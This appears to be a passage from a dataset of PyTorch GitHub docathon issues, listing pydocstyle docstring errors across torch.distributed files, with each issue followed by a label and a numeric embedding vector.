- **File**: `torch/distributed/algorithms/_comm_hooks/default_hooks.py`, **Entity**: `fp16_compress_hook`, **Line**: 131, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/algorithms/_comm_hooks/default_hooks.py`, **Entity**: `fp16_compress_hook`, **Line**: 131, **Description**: First line should end with a period (not 'n')
- **File**: `torch/distributed/algorithms/_comm_hooks/default_hooks.py`, **Entity**: `fp16_compress_hook`, **Line**: 131, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **File**: `torch/distributed/algorithms/_comm_hooks/default_hooks.py`, **Entity**: `bf16_compress_hook`, **Line**: 148, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/algorithms/_comm_hooks/default_hooks.py`, **Entity**: `bf16_compress_hook`, **Line**: 148, **Description**: First line should end with a period (not 'n')
- **File**: `torch/distributed/algorithms/_comm_hooks/default_hooks.py`, **Entity**: `bf16_compress_hook`, **Line**: 148, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **File**: `torch/distributed/algorithms/_quantization/quantization.py`, **Entity**: `DQuantType`, **Line**: 13, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/distributed/algorithms/_quantization/quantization.py`, **Entity**: `DQuantType`, **Line**: 13, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/algorithms/_quantization/quantization.py`, **Entity**: `auto_quantize`, **Line**: 90, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/algorithms/_quantization/quantization.py`, **Entity**: `auto_quantize`, **Line**: 90, **Description**: First line should end with a period (not 'd')
- **File**: `torch/distributed/algorithms/_quantization/quantization.py`, **Entity**: `auto_quantize`, **Line**: 90, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **File**: `torch/distributed/benchmarks/benchmark_ddp_rpc.py`, **Entity**: `HybridModel`, **Line**: 34, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/benchmarks/benchmark_ddp_rpc.py`, **Entity**: `HybridModel`, **Line**: 34, **Description**: Docstring is under-indented
- **File**: `torch/distributed/benchmarks/benchmark_ddp_rpc.py`, **Entity**: `HybridModel`, **Line**: 34, **Description**: First line should end with a period (not 'n')
- **File**: `torch/distributed/benchmarks/benchmark_ddp_rpc.py`, **Entity**: `_run_trainer`, **Line**: 119, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/distributed/benchmarks/benchmark_ddp_rpc.py`, **Entity**: `_run_trainer`, **Line**: 119, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/benchmarks/benchmark_ddp_rpc.py`, **Entity**: `_run_trainer`, **Line**: 119, **Description**: Docstring is under-indented
- **File**: `torch/distributed/benchmarks/benchmark_ddp_rpc.py`, **Entity**: `_run_trainer`, **Line**: 119, **Description**: First line should end with a period (not 'e')
- **File**: `torch/distributed/benchmarks/benchmark_ddp_rpc.py`, **Entity**: `run_worker`, **Line**: 201, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/distributed/benchmarks/benchmark_ddp_rpc.py`, **Entity**: `run_worker`, **Line**: 201, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/benchmarks/benchmark_ddp_rpc.py`, **Entity**: `run_worker`, **Line**: 201, **Description**: Docstring is under-indented
- **File**: `torch/distributed/benchmarks/benchmark_ddp_rpc.py`, **Entity**: `run_worker`, **Line**: 201, **Description**: First line should end with a period (not 'n')
- **File**: `torch/distributed/benchmarks/benchmark_ddp_rpc.py`, **Entity**: `run_worker`, **Line**: 201, **Description**: First line should be in imperative mood; try rephrasing (found 'A')
- **File**: `torch/distributed/pipeline/sync/batchnorm.py`, **Entity**: `DeferredBatchNorm`, **Line**: 24, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/pipeline/sync/batchnorm.py`, **Entity**: `DeferredBatchNorm`, **Line**: 24, **Description**: First line should end with a period (not 'g')
- **File**: `torch/distributed/pipeline/sync/batchnorm.py`, **Entity**: `_commit`, **Line**: 73, **Description**: First line should be in imperative mood (perhaps 'Update', not 'Updates')
- **File**: `torch/distributed/pipeline/sync/batchnorm.py`, **Entity**: `convert_deferred_batch_norm`, **Line**: 136, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/pipeline/sync/batchnorm.py`, **Entity**: `convert_deferred_batch_norm`, **Line**: 136, **Description**: First line should end with a period (not 'g')
- **File**: `torch/distributed/pipeline/sync/batchnorm.py`, **Entity**: `convert_deferred_batch_norm`, **Line**: 136, **Description**: First line should be in imperative mood (perhaps 'Convert', not 'Converts')
- **File**: `torch/distributed/pipeline/sync/copy.py`, **Entity**: ``, **Line**: 7, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/pipeline/sync/copy.py`, **Entity**: ``, **Line**: 7, **Description**: First line should end with a period (not 'y')
- **File**: `torch/distributed/pipeline/sync/dependency.py`, **Entity**: `join`, **Line**: 40, **Description**: First line should be in imperative mood (perhaps 'Merge', not 'Merges')
- **File**: `torch/distributed/pipeline/sync/phony.py`, **Entity**: `get_phony`, **Line**: 22, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/pipeline/sync/phony.py`, **Entity**: `get_phony`, **Line**: 22, **Description**: First line should end with a period (not 'e')
- **File**: `torch/distributed/pipeline/sync/phony.py`, **Entity**: `get_phony`, **Line**: 22, **Description**: First line should be in imperative mood (perhaps 'Get', not 'Gets')
- **File**: `torch/distributed/pipeline/sync/pipeline.py`, **Entity**: `_clock_cycles`, **Line**: 65, **Description**: First line should be in imperative mood (perhaps 'Generate', not 'Generates')
- **File**: `torch/distributed/pipeline/sync/pipeline.py`, **Entity**: `run`, **Line**: 102, **Description**: First line should be in imperative mood (perhaps 'Run', not 'Runs')
- **File**: `torch/distributed/pipeline/sync/pipeline.py`, **Entity**: `fence`, **Line**: 123, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/pipeline/sync/pipeline.py`, **Entity**: `fence`, **Line**: 123, **Description**: First line should end with a period (not 's')
- **File**: `torch/distributed/pipeline/sync/pipeline.py`, **Entity**: `fence`, **Line**: 123, **Description**: First line should be in imperative mood (perhaps 'Copy', not 'Copies')
- **File**: `torch/distributed/pipeline/sync/pipeline.py`, **Entity**: `compute`, **Line**: 148, **Description**: First line should be in imperative mood (perhaps 'Run', not 'Runs')
- **File**: `torch/distributed/pipeline/sync/utils.py`, **Entity**: `partition_model`, **Line**: 10, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/pipeline/sync/utils.py`, **Entity**: `partition_model`, **Line**: 10, **Description**: First line should end with a period (not 's')
- **File**: `torch/distributed/pipeline/sync/worker.py`, **Entity**: `worker`, **Line**: 70, **Description**: First line should be in imperative mood; try rephrasing (found 'The')
- **File**: `torch/distributed/pipeline/sync/checkpoint.py`, **Entity**: `checkpoint`, **Line**: 71, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/pipeline/sync/checkpoint.py`, **Entity**: `checkpoint`, **Line**: 71, **Description**: First line should end with a period (not 'e')
- **File**: `torch/distributed/pipeline/sync/checkpoint.py`, **Entity**: `checkpoint`, **Line**: 71, **Description**: First line should be in imperative mood (perhaps 'Make', not 'Makes')
- **File**: `torch/distributed/pipeline/sync/checkpoint.py`, **Entity**: `checkpoint`, **Line**: 97, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/distributed/pipeline/sync/checkpoint.py`, **Entity**: `recompute`, **Line**: 115, **Description**: First line should be in imperative mood (perhaps 'Apply', not 'Applies')
- **File**: `torch/distributed/pipeline/sync/checkpoint.py`, **Entity**: `enable_checkpointing`, **Line**: 139, **Description**: First line should be in imperative mood (perhaps 'Make', not 'Makes')
- **File**: `torch/distributed/pipeline/sync/checkpoint.py`, **Entity**: `enable_recomputing`, **Line**: 150, **Description**: First line should be in imperative mood (perhaps 'Make', not 'Makes')
- **File**: `torch/distributed/pipeline/sync/checkpoint.py`, **Entity**: `is_recomputing`, **Line**: 170, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/pipeline/sync/checkpoint.py`, **Entity**: `is_recomputing`, **Line**: 170, **Description**: First line should end with a period (not 't')
- **File**: `torch/distributed/pipeline/sync/checkpoint.py`, **Entity**: `Context`, **Line**: 194, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/pipeline/sync/checkpoint.py`, **Entity**: `Context`, **Line**: 194, **Description**: First line should end with a period (not 'd')
- **File**: `torch/distributed/pipeline/sync/checkpoint.py`, **Entity**: `save_rng_states`, **Line**: 211, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/pipeline/sync/checkpoint.py`, **Entity**: `save_rng_states`, **Line**: 211, **Description**: First line should end with a period (not 'r')
- **File**: `torch/distributed/pipeline/sync/checkpoint.py`, **Entity**: `restore_rng_states`, **Line**: 230, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/pipeline/sync/checkpoint.py`, **Entity**: `restore_rng_states`, **Line**: 230, **Description**: First line should end with a period (not 's')

cc @carljparker",False,"[-2.77256608e-01 -4.89474416e-01 -1.54587582e-01 -3.07513297e-01
 -3.77810001e-02 -4.25156280e-02 -4.10381779e-02  1.27035916e-01
 -4.25530463e-01  7.17387423e-02  6.68393448e-02  1.48474500e-02
  1.10682018e-01  2.12526903e-01 -9.89291817e-02  2.29986295e-01
 -3.41929018e-01 -4.03755695e-01  4.00996327e-01  2.54814684e-01
  2.48217471e-02  2.55177557e-01 -1.40426993e-01  9.62803066e-02
 -3.72517169e-01  6.70548677e-02 -1.39045596e-01 -1.94866508e-01
 -7.25342259e-02 -1.43187910e-01  1.86473310e-01  2.77355164e-01
 -1.21487692e-01 -4.10447568e-02  4.04201269e-01  3.06411475e-01
 -1.47729635e-01 -2.07987592e-01  3.34547423e-02  1.53899968e-01
  1.01839840e-01  8.92766193e-03 -1.54585242e-01  4.07850258e-02
  2.66370736e-02 -2.73710072e-01 -2.37613946e-01  3.08072627e-01
 -2.17251152e-01  1.35701582e-01 -1.25534609e-01  1.63440898e-01
 -4.45763588e-01 -1.32085070e-01  1.40869424e-01 -1.40268713e-01
 -1.33049592e-01  5.07580817e-01  4.03888226e-02 -4.62992042e-02
  9.85709429e-02  1.37082875e-01  8.10674727e-02  3.52215499e-01
 -6.29371554e-02  3.41575801e-01  1.71398640e-01  1.06551036e-01
  4.88492399e-01  1.52289793e-02 -3.21285903e-01  1.55382557e-02
 -5.83454132e-01 -3.39634150e-01  1.61362551e-02  3.71355832e-01
 -3.20706666e-01 -8.99826512e-02 -1.94717363e-01 -1.99676812e-01
 -2.63815820e-01 -9.23225954e-02  8.16229284e-02  4.38960548e-03
  9.45939347e-02 -1.41019076e-01  6.74200356e-02 -1.97676957e-01
  3.71571258e-02  2.40665674e-03  5.98257542e-01 -9.54851061e-02
 -2.00317442e-01  3.86857927e-01  1.22453496e-01  3.18046629e-01
  8.32390934e-02  9.82404128e-02 -4.15839367e-02 -1.71293139e-01
  1.92036867e-01 -2.63624072e-01 -2.77055681e-01  1.70861095e-01
  2.77623415e-01  2.49988995e-02  2.03127816e-01 -3.28658551e-01
  1.32629186e-01 -2.34929398e-02  9.13558751e-02 -4.24909666e-02
  2.86945760e-01 -6.24854974e-02  2.85503685e-01  4.58922088e-02
 -3.62027287e-01  1.02413833e-01 -4.07661349e-01  1.24535911e-01
  1.07582882e-01  2.47320235e-01  6.77707419e-02  9.42387432e-02
  1.47336330e-02  7.41619840e-02  1.25396952e-01 -1.61469206e-02
  9.53143388e-02 -2.72657633e-01  2.02228785e-01 -1.01869106e-02
 -5.31655550e-02  2.05196917e-01  2.42994100e-01  8.41431618e-02
 -3.10292542e-01 -4.66273367e-01 -8.58738422e-02 -1.99642241e-01
 -3.66816223e-01 -3.98345113e-01 -1.03666976e-01 -8.18444192e-02
  3.02380860e-01  5.22327542e-01 -3.60842198e-01  3.15721452e-01
 -9.94183123e-02  1.76926389e-01 -5.36727393e-03  2.28918381e-02
 -1.72372103e-01  3.54135871e-01  5.95780835e-02  1.99397802e-01
  4.23675895e-01  8.16579759e-02 -1.20080814e-01 -3.98355067e-01
 -1.32582963e-01  3.24036717e-01 -1.33084863e-01 -1.22086063e-01
 -1.38413906e-01  5.18056154e-02 -1.81831509e-01 -9.54179764e-02
 -3.89460504e-01 -9.59456414e-02  1.30773515e-01  2.51706719e-01
 -2.49741524e-02 -2.33309403e-01  8.39067549e-02  1.04835406e-01
 -2.10748807e-01 -3.34010482e-01  4.81573716e-02  2.08888501e-01
 -1.19731545e-01  3.63596052e-01 -8.27181563e-02 -7.56450444e-02
 -1.55940503e-01  1.14749715e-01  1.24096364e-01  3.94408032e-02
  3.32330167e-01  3.39055777e-01 -2.72271112e-02 -1.73601836e-01
  2.74578184e-01  6.23605549e-02 -1.42484814e-01 -1.88448519e-01
  5.37191272e-01  6.44022524e-01  1.38261124e-01  1.08459421e-01
 -1.08611323e-01  2.52833933e-01  9.13002044e-02 -9.99092404e-03
  4.37138855e-01  3.62203754e-02 -1.14801027e-01 -1.34105474e-01
 -2.67675787e-01  1.40086114e-01 -2.55860180e-01  1.14116490e-01
 -1.38468444e-01 -4.85136926e-01 -2.73970664e-01  3.81065786e-01
  2.91981280e-01 -1.18382357e-01  1.89120933e-01 -1.90028965e-01
 -9.64279622e-02 -1.94744840e-02 -3.66168544e-02 -1.91637069e-01
  3.09262067e-01  1.66927539e-02  1.63445875e-01  9.08797979e-02
 -1.20685235e-01  2.38415822e-02 -3.98869552e-02 -1.25731781e-01
  6.91982388e-01 -1.37608182e-02  7.31577724e-02  1.34664923e-01
  2.23385856e-01 -7.91336000e-02  1.75625429e-01  8.35156068e-02
 -8.43393058e-02  2.47572735e-02 -8.79929662e-02 -3.91402990e-02
  2.14297980e-01 -4.40578341e-01 -1.54233143e-01 -1.78235888e-01
 -2.26548880e-01  1.20913386e-01 -3.83968472e-01 -4.53429520e-01
  3.27852726e-01 -4.50895056e-02  3.76571119e-01  9.99184251e-02
 -7.10551083e-01 -1.43520907e-01  2.45566607e-01  1.60603404e-01
 -3.86670344e-02  2.49721989e-01 -6.95970058e-02  2.10415095e-01
  4.32357728e-01 -1.21910930e-01 -2.90639520e-01  1.38918199e-02
  1.18810952e-01 -2.23279104e-01  1.36903644e-01 -4.13664907e-01
  2.70959049e-01  1.82912394e-01  3.46004128e-01  1.67812660e-01
  4.26927686e-01 -2.24682596e-02 -1.64367139e-01  2.56966114e-01
 -2.49128148e-01  4.26437914e-01 -2.56968141e-01 -2.10096538e-02
  5.89153886e-01 -1.58510700e-01 -2.06169039e-01 -2.59160936e-01
 -4.85534191e-01 -1.46071658e-01 -8.31339657e-02 -5.08784950e-02
  3.45859051e-01 -2.77212076e-02  9.60649475e-02  9.04125273e-02
  2.55148858e-04  8.91459286e-02  3.86095643e-01  9.27567482e-03
 -5.98988712e-01 -1.40410602e-01  1.09651014e-01  3.58102053e-01
  2.92895347e-01  1.98432833e-01  1.60901695e-01  2.48290420e-01
  8.89579952e-02 -3.24654669e-01  5.87597191e-01  3.45874578e-01
 -3.40144336e-01  2.41770446e-02 -8.81521031e-03 -1.06397271e-01
 -7.77831599e-02  6.42183423e-01  2.37501770e-01  9.91728157e-03
 -1.30845100e-01 -3.83129597e-01 -4.08683181e-01  1.09964371e-01
  1.02047741e-01 -7.09073991e-02 -6.07244492e-01 -6.37490004e-02
 -2.90656388e-01 -1.66932940e-01  2.79905289e-01  2.82539248e-01
 -1.26247853e-01 -8.22012275e-02 -1.31208569e-01  4.88994792e-02
 -2.98744619e-01  2.14678943e-01  8.95899087e-02 -3.36321235e-01
 -5.11428192e-02 -8.93270150e-02  1.79460973e-01 -6.39616549e-01
 -2.05763966e-01 -9.22477841e-02  1.56551808e-01  4.33451831e-01
 -1.58105344e-01 -2.78606594e-01  4.89856601e-01 -2.68171847e-01
 -3.39150846e-01  5.00587150e-02 -4.14938331e-02  2.93429732e-01
 -5.99435270e-02  2.31295720e-01 -6.46636412e-02  3.34396780e-01
 -4.68607426e-01 -1.90382212e-01 -3.46757442e-01 -3.47268909e-01
 -1.01265810e-01 -2.51456052e-01 -1.09151155e-01  2.06940874e-01
  6.02416229e-03  1.00281358e-01 -2.89841413e-01  9.67991948e-02
 -1.33572251e-01  1.40974581e-01  9.62445885e-02  9.38334018e-02
  1.68480396e-01  1.35250956e-01 -2.07241885e-02 -2.38894343e-01
 -5.63811541e-01  3.05706739e-01  3.52619469e-01 -2.69583285e-01]"
"Fix docstring errors in functional.py, remote_module.py, named_optimizer.py, join.py module: docs triaged medium docathon-h2-2023","Please fix the following issues. To test locally, run: 
 ```
pydocstyle path-to-file --count
```
Run this command before and after fixing the errors. This command prints out the number of errors at the end of the output. Paste the output to your PR description with the number before and after. 
- **File**: `torch/distributed/optim/named_optimizer.py`, **Entity**: `_NamedOptimizer`, **Line**: 20, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/optim/named_optimizer.py`, **Entity**: `_NamedOptimizer`, **Line**: 20, **Description**: First line should end with a period (not 'y')
- **File**: `torch/distributed/optim/named_optimizer.py`, **Entity**: `state_dict`, **Line**: 122, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/optim/named_optimizer.py`, **Entity**: `state_dict`, **Line**: 122, **Description**: First line should end with a period (not 'x')
- **File**: `torch/distributed/optim/named_optimizer.py`, **Entity**: `step`, **Line**: 148, **Description**: First line should be in imperative mood (perhaps 'Perform', not 'Performs')
- **File**: `torch/distributed/optim/named_optimizer.py`, **Entity**: `load_state_dict`, **Line**: 157, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/optim/named_optimizer.py`, **Entity**: `load_state_dict`, **Line**: 157, **Description**: First line should end with a period (not 't')
- **File**: `torch/distributed/optim/named_optimizer.py`, **Entity**: `load_state_dict`, **Line**: 157, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **File**: `torch/distributed/optim/named_optimizer.py`, **Entity**: `init_state`, **Line**: 288, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/optim/named_optimizer.py`, **Entity**: `init_state`, **Line**: 288, **Description**: First line should end with a period (not 'e')
- **File**: `torch/distributed/optim/named_optimizer.py`, **Entity**: `init_state`, **Line**: 288, **Description**: First line should be in imperative mood (perhaps 'Run', not 'Runs')
- **File**: `torch/distributed/optim/named_optimizer.py`, **Entity**: `_gen_param_group_key`, **Line**: 319, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/distributed/nn/functional.py`, **Entity**: `all_to_all`, **Line**: 155, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/nn/functional.py`, **Entity**: `all_to_all`, **Line**: 155, **Description**: First line should end with a period (not 'd')
- **File**: `torch/distributed/nn/functional.py`, **Entity**: `all_to_all_single`, **Line**: 178, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/nn/functional.py`, **Entity**: `all_to_all_single`, **Line**: 178, **Description**: First line should end with a period (not 't')
- **File**: `torch/distributed/nn/functional.py`, **Entity**: `all_reduce`, **Line**: 203, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/nn/functional.py`, **Entity**: `all_reduce`, **Line**: 203, **Description**: First line should end with a period (not 't')
- **File**: `torch/distributed/nn/api/remote_module.py`, **Entity**: `__init__`, **Line**: 135, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/nn/api/remote_module.py`, **Entity**: `__init__`, **Line**: 135, **Description**: First line should be in imperative mood; try rephrasing (found 'A')
- **File**: `torch/distributed/nn/api/remote_module.py`, **Entity**: `remote_parameters`, **Line**: 283, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/nn/api/remote_module.py`, **Entity**: `remote_parameters`, **Line**: 283, **Description**: First line should end with a period (not 'e')
- **File**: `torch/distributed/nn/api/remote_module.py`, **Entity**: `remote_parameters`, **Line**: 283, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/distributed/nn/api/remote_module.py`, **Entity**: `get_module_rref`, **Line**: 301, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/nn/api/remote_module.py`, **Entity**: `get_module_rref`, **Line**: 301, **Description**: First line should end with a period (not ')')
- **File**: `torch/distributed/nn/api/remote_module.py`, **Entity**: `get_module_rref`, **Line**: 301, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/distributed/nn/api/remote_module.py`, **Entity**: `_prepare_init`, **Line**: 461, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/distributed/nn/api/remote_module.py`, **Entity**: `_prepare_init`, **Line**: 461, **Description**: First line should be in imperative mood (perhaps 'Prepare', not 'Prepares')
- **File**: `torch/distributed/nn/api/remote_module.py`, **Entity**: `_init_template`, **Line**: 484, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/distributed/nn/api/remote_module.py`, **Entity**: `_init_template`, **Line**: 484, **Description**: First line should be in imperative mood (perhaps 'Instantiate', not 'Instantiates')
- **File**: `torch/distributed/nn/api/remote_module.py`, **Entity**: `_check_attribute_picklability`, **Line**: 493, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/distributed/nn/api/remote_module.py`, **Entity**: `_check_attribute_picklability`, **Line**: 493, **Description**: First line should be in imperative mood (perhaps 'Check', not 'Checks')
- **File**: `torch/distributed/nn/api/remote_module.py`, **Entity**: `init_from_module_rref`, **Line**: 518, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/nn/api/remote_module.py`, **Entity**: `RemoteModule`, **Line**: 609, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/nn/api/remote_module.py`, **Entity**: `_remote_module_receiver`, **Line**: 696, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/distributed/nn/api/remote_module.py`, **Entity**: `_remote_module_reducer`, **Line**: 718, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/distributed/nn/api/remote_module.py`, **Entity**: `_remote_module_reducer`, **Line**: 718, **Description**: First line should be in imperative mood (perhaps 'Serialize', not 'Serializes')
- **File**: `torch/distributed/nn/api/remote_module.py`, **Entity**: `_recursive_script_module_receiver`, **Line**: 748, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/distributed/nn/api/remote_module.py`, **Entity**: `_recursive_script_module_reducer`, **Line**: 757, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/nn/api/remote_module.py`, **Entity**: `_recursive_script_module_reducer`, **Line**: 757, **Description**: First line should end with a period (not ',')
- **File**: `torch/distributed/nn/api/remote_module.py`, **Entity**: `_recursive_script_module_reducer`, **Line**: 757, **Description**: First line should be in imperative mood (perhaps 'Serialize', not 'Serializes')
- **File**: `torch/distributed/algorithms/join.py`, **Entity**: `JoinHook`, **Line**: 12, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/distributed/algorithms/join.py`, **Entity**: `JoinHook`, **Line**: 12, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/algorithms/join.py`, **Entity**: `JoinHook`, **Line**: 12, **Description**: First line should end with a period (not 'n')
- **File**: `torch/distributed/algorithms/join.py`, **Entity**: `main_hook`, **Line**: 23, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/algorithms/join.py`, **Entity**: `main_hook`, **Line**: 23, **Description**: First line should end with a period (not 's')
- **File**: `torch/distributed/algorithms/join.py`, **Entity**: `main_hook`, **Line**: 23, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **File**: `torch/distributed/algorithms/join.py`, **Entity**: `post_hook`, **Line**: 31, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/algorithms/join.py`, **Entity**: `post_hook`, **Line**: 31, **Description**: First line should end with a period (not 'n')
- **File**: `torch/distributed/algorithms/join.py`, **Entity**: `post_hook`, **Line**: 31, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **File**: `torch/distributed/algorithms/join.py`, **Entity**: `Joinable`, **Line**: 44, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/distributed/algorithms/join.py`, **Entity**: `Joinable`, **Line**: 44, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/algorithms/join.py`, **Entity**: `Joinable`, **Line**: 44, **Description**: First line should end with a period (not 's')
- **File**: `torch/distributed/algorithms/join.py`, **Entity**: `join_hook`, **Line**: 58, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/distributed/algorithms/join.py`, **Entity**: `join_device`, **Line**: 72, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/algorithms/join.py`, **Entity**: `join_device`, **Line**: 72, **Description**: First line should end with a period (not 's')
- **File**: `torch/distributed/algorithms/join.py`, **Entity**: `join_process_group`, **Line**: 81, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/algorithms/join.py`, **Entity**: `join_process_group`, **Line**: 81, **Description**: First line should end with a period (not 'y')
- **File**: `torch/distributed/algorithms/join.py`, **Entity**: `_JoinConfig`, **Line**: 89, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/distributed/algorithms/join.py`, **Entity**: `_JoinConfig`, **Line**: 89, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/algorithms/join.py`, **Entity**: `_JoinConfig`, **Line**: 89, **Description**: First line should end with a period (not 'e')
- **File**: `torch/distributed/algorithms/join.py`, **Entity**: `construct_disabled_join_config`, **Line**: 99, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/algorithms/join.py`, **Entity**: `construct_disabled_join_config`, **Line**: 99, **Description**: First line should end with a period (not 'd')
- **File**: `torch/distributed/algorithms/join.py`, **Entity**: `construct_disabled_join_config`, **Line**: 99, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/distributed/algorithms/join.py`, **Entity**: `Join`, **Line**: 113, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/distributed/algorithms/join.py`, **Entity**: `Join`, **Line**: 113, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/algorithms/join.py`, **Entity**: `Join`, **Line**: 113, **Description**: First line should end with a period (not 'm')
- **File**: `torch/distributed/algorithms/join.py`, **Entity**: `_set_joinable_configs`, **Line**: 189, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/distributed/algorithms/join.py`, **Entity**: `_set_joinable_configs`, **Line**: 189, **Description**: First line should be in imperative mood (perhaps 'Set', not 'Sets')
- **File**: `torch/distributed/algorithms/join.py`, **Entity**: `_extract_dist_info`, **Line**: 203, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/algorithms/join.py`, **Entity**: `_extract_dist_info`, **Line**: 203, **Description**: First line should be in imperative mood (perhaps 'Extract', not 'Extracts')
- **File**: `torch/distributed/algorithms/join.py`, **Entity**: `__exit__`, **Line**: 238, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/algorithms/join.py`, **Entity**: `__exit__`, **Line**: 238, **Description**: First line should end with a period (not 's')
- **File**: `torch/distributed/algorithms/join.py`, **Entity**: `_get_num_nonjoined_procs`, **Line**: 286, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/algorithms/join.py`, **Entity**: `_get_num_nonjoined_procs`, **Line**: 286, **Description**: First line should end with a period (not 'e')
- **File**: `torch/distributed/algorithms/join.py`, **Entity**: `_get_num_nonjoined_procs`, **Line**: 286, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/distributed/algorithms/join.py`, **Entity**: `_notify_procs_to_terminate`, **Line**: 295, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/algorithms/join.py`, **Entity**: `_notify_procs_to_terminate`, **Line**: 295, **Description**: First line should end with a period (not 'e')
- **File**: `torch/distributed/algorithms/join.py`, **Entity**: `notify_join_context`, **Line**: 306, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/distributed/algorithms/join.py`, **Entity**: `notify_join_context`, **Line**: 306, **Description**: First line should end with a period (not 't')

cc @carljparker",False,"[-1.96355909e-01 -1.90106362e-01 -2.69741789e-02 -1.24508277e-01
  9.72761586e-02 -1.82217091e-01 -1.33439809e-01  2.02969596e-01
 -3.26627254e-01  1.10821441e-01  8.52289647e-02  4.30820175e-02
  9.11355689e-02  1.88151911e-01  3.19963954e-02  4.89686057e-02
 -3.27794194e-01 -5.50937772e-01  1.53804883e-01  1.03636414e-01
  1.38470188e-01  4.65332657e-01 -7.41085932e-02 -2.07544900e-02
 -1.34034216e-01  6.36407807e-02 -3.40630174e-01 -8.36618841e-02
  4.82958890e-02  1.30495131e-01  2.47323126e-01  1.00538671e-01
 -3.21687877e-01 -3.08419112e-04  4.18949187e-01  3.05624336e-01
 -2.05465898e-01 -1.74627990e-01 -3.85326780e-02  1.09971985e-01
 -7.36407749e-03 -1.95571050e-01 -9.58341807e-02  1.57440249e-02
  4.67799306e-02 -2.06976816e-01 -1.69667080e-01  1.93350703e-01
 -9.79603007e-02  4.21825945e-02 -2.23070323e-01  1.31258577e-01
 -1.82961732e-01  3.85308117e-02  2.84530163e-01 -5.45173511e-02
 -4.83758450e-02  5.84337413e-01 -1.64203648e-03 -2.76437879e-01
  1.67949587e-01  1.81872174e-01 -1.53121114e-01 -1.50090680e-02
 -1.42106459e-01  2.79514343e-01  2.95905285e-02  7.48825371e-02
  3.89552295e-01  1.72651023e-01 -2.25007415e-01  1.58883184e-02
